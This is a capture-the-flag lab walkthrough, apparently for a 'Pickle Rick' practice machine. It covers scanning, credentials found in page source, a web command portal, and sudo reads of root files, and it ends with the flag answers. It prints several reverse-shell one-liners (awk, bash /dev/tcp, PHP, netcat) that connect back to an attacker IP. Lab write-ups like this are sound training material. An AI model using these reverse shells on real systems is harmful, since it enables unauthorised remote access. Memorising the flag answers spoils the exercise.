``IP Address = 10.10.12.75``

# Nmap Scan Result

## Open Ports:

```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```
### Operating System: Ubuntu


Command: `nmap -sTV -O -sC {IP Address}`


### Nikto Scan

```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.12.75
+ Target Hostname:    10.10.12.75
+ Target Port:        80
+ Start Time:         2021-05-02 01:37:19 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 426, size: 5818ccf125686, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ Cookie PHPSESSID created without the httponly flag
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.php: Admin login page/section found.
+ 7889 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2021-05-02 02:31:46 (GMT-4) (3267 seconds)
------------------------------------------------------------------
```

Command Syntax: `nikto -host http://{IP Address}`


## Target WebServer Enumeration

Main page of the website have comment on its source code that is 

Username: `R1ckRul3s`

that looks usefull. target website page or subdirectry robots.txt have rendom string that is`Wubbalubbadubdub`This is Suspicious  

## Directry Scanning 

**/assets**
this have some Common Thing use in website nothing more
**robots.txt**

As nikto finds `login.php` so go for it.They required username and password we found username and some rendom string try for it 

It works and they provide some command execution portal and this is vulnerable and good for us

Use ls and there is first ingreden `Sup3rS3cretPickl3Ingred.txt` use cat to view the content of the file. looks they use some filters for command so how we see the content of the file. There are some other command also like `more`,`head`,`tail`,`less` use it find which will works

There is not need for getting rev-shell but i can try to get reverse shell for furthure Post Exploitation

## Getting reverse shell 

start a lisener on your machine with netcat and pawncat which you use

unfortunativly i can't get the reverse shell and 

but by checking the source code of the portal.php file i found some base64 encode string 

by decoding it this is "rabithole"

After try alot of reverse shell code i get connetion with this reverse shell code

``awk 'BEGIN {s = "/inet/tcp/0/10.8.186.33/9001"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null``

now we can try to find other ingredent and they are in /home/rick directry its name is second ingredients
**Note: they have spaces in there name so use the quotes in the command for see this file like the following command**

``less /home/rick/"second ingredients"``

This give me reveseshell but this only replicat the webshell in your terminal this is not normal shell and there you use all commands that are terminate like cat,more,head. i try to gain proper reverse shell which the following code but i cant. php and netcat number 4 shell work but that are not that usefull.

```
1) bash -i >& /dev/tcp/10.8.186.33/5555 0>&1

2) php -r '$sock=fsockopen("10.8.186.33",5555);exec("/bin/sh -i <&3 >&3 2>&3");'

3) nc -e /bin/sh 10.8.186.33 5555

4) rm -f /tmp/p; mknod /tmp/p p && nc 10.8.186.33 5555 0/tmp/p
```

So, now i using the web shell for finding the ingredent so first i use the following command for suid 

``fing / -perm /4000 2>/dev/null``

They show me the following result 
```
/snap/core/5742/bin/mount
/snap/core/5742/bin/ping
/snap/core/5742/bin/ping6
/snap/core/5742/bin/su
/snap/core/5742/bin/umount
/snap/core/5742/usr/bin/chfn
/snap/core/5742/usr/bin/chsh
/snap/core/5742/usr/bin/gpasswd
/snap/core/5742/usr/bin/newgrp
/snap/core/5742/usr/bin/passwd
/snap/core/5742/usr/bin/sudo
/snap/core/5742/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/5742/usr/lib/openssh/ssh-keysign
/snap/core/5742/usr/lib/snapd/snap-confine
/snap/core/5742/usr/sbin/pppd
/snap/core/6350/bin/mount
/snap/core/6350/bin/ping
/snap/core/6350/bin/ping6
/snap/core/6350/bin/su
/snap/core/6350/bin/umount
/snap/core/6350/usr/bin/chfn
/snap/core/6350/usr/bin/chsh
/snap/core/6350/usr/bin/gpasswd
/snap/core/6350/usr/bin/newgrp
/snap/core/6350/usr/bin/passwd
/snap/core/6350/usr/bin/sudo
/snap/core/6350/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/6350/usr/lib/openssh/ssh-keysign
/snap/core/6350/usr/lib/snapd/snap-confine
/snap/core/6350/usr/sbin/pppd
/bin/umount
/bin/fusermount
/bin/ntfs-3g
/bin/ping
/bin/su
/bin/ping6
/bin/mount
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/at
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
```

There i see sudo have suid bit on by using this i can see the root folder igredent. first see what is the name of the file of third igredent using 

``/usr/bin/sudo ls -al /root``

Using this i come to know the file name is `3rd.txt` so just using the following command and i see the ingredent

`/usr/bin/sudo less /root/3rd.txt`




Here we find all the ingredent 
```
Q1:What is the first ingredient Rick needs?
A: mr. meeseek hair

Q2:Whats the second ingredient Rick needs?
A:1 jerry tear

Q4:Whats the final ingredient Rick needs?
A:fleeb juice
```
